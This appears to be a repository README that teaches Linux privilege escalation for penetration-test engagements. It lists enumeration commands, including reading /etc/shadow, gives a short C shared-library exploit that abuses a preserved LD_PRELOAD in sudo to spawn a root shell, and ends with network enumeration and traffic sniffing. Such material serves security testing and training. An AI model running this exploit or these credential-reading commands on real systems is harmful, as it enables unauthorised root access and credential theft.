# Linux-PrivEsc-full-guide

Hi Folks! I made this repo that share the privilege escalation techniques I tend to use on Linux systems. At the moment, you will see basic stuff which works the best IRL but later I am going to add CTF specific techniques. Let's get into it!

# Enumeration

So, one of the your target company's users downloaded and executed a malicious file you happened to send them. You found credentials in clear text and connected back to the machine using SSH. What's the first thing you do? Identify where the hell are you and what you can do at this point of the engagement. For that I use the following commands:

## Some basic enumeration
```sh
history                            # identify previously executed commands in the shell
whoami                             # enumerate the user
id                                 # enumerate the user
cat /etc/{passwd,shadow,group}     # check if we can see the stored passwords, users, groups
cat /etc/{passwd,group}            # same but without shadow (usually 'Permission denied')
ps aux, ps aux | grep root         # see unusual processes and processes run by the root user
```

## Further enumeration of the system, kernel version, errors..etc
```sh
hostname
hostname --all-{fqdns,ip-addresses}
cat proc/{version,issue}
uname --kernel-{name,release,version}
uname --all
lscpu

sudo -l                            # to check which commands I can run as a super user without the password
```

After executing `sudo -l` check the value of LD_PRELOAD, \
if you see something like this: `env_keep += LD_PRELOAD` - Than you can use the following little `C src` to gain root access:

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init(){
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}
```

# Network enumeration

```sh
ifconfig   # to see network interfaces, ip addresses..etc
ip a       # alternative for ifconfig
ip -c a    # output in color
arp -a     # check to ARP table and discover additional assets on the subnet
ip neigh   # alternative for the arp command
ip route   # check the route table and discover gateways, additional IPs
netstat    # to see active connections

wireshark                                 # The network traffic analyzer - Wireshark
tcpdump -i <interface> -s 65535 -w <file> # The command-line network traffic analyzer - TCPDump
```

## Try to sniff traffic, it's less noisy and you have more data to work with during the engagement
